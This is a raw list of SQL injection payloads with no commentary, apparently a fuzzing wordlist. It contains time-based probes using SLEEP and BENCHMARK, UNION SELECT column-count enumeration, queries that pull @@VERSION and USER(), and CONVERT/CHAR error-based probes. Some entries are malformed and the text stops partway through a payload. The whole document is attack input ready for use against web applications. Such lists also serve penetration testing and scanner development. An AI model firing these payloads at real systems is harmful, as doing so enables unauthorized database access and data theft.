1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- UNION ALL SELECT 1 UNION ALL SELECT 1,2 UNION ALL SELECT 1,2,3 UNION ALL SELECT 1,2,3,4 UNION ALL SELECT 1,2,3,4,5 UNION ALL SELECT 1,2,3,4,5,6 UNION ALL SELECT 1,2,3,4,5,6,7 UNION ALL SELECT 1,2,3,4,5,6,7,8 UNION ALL SELECT 1,2,3,4,5,6,7,8,9 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 UNION ALL SELECT 1# UNION ALL SELECT 1,2# UNION ALL SELECT 1,2,3# UNION ALL SELECT 1,2,3,4# UNION ALL SELECT 1,2,3,4,5# UNION ALL SELECT 1,2,3,4,5,6# UNION ALL SELECT 1,2,3,4,5,6,7# UNION ALL SELECT 1,2,3,4,5,6,7,8# UNION ALL SELECT 1,2,3,4,5,6,7,8,9# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29# UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30# UNION ALL SELECT 1-- UNION ALL SELECT 1,2-- UNION ALL SELECT 1,2,3-- UNION ALL SELECT 1,2,3,4-- UNION ALL SELECT 1,2,3,4,5-- UNION ALL SELECT 1,2,3,4,5,6-- UNION ALL SELECT 1,2,3,4,5,6,7-- UNION ALL SELECT 1,2,3,4,5,6,7,8-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- UNION SELECT @@VERSION,SLEEP(5),3 UNION SELECT @@VERSION,SLEEP(5),USER(),4 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 UNION SELECT @@VERSION,SLEEP(5),\"'3 UNION SELECT @@VERSION,SLEEP(5),\"'3'\"# UNION SELECT @@VERSION,SLEEP(5),USER(),4# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29# UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30# UNION ALL SELECT USER()-- UNION ALL SELECT SLEEP(5)-- UNION ALL SELECT USER(),SLEEP(5)-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT NULL-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- UNION ALL SELECT NULL# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))# AND 5650=CONVERT(INT,(UNION ALL 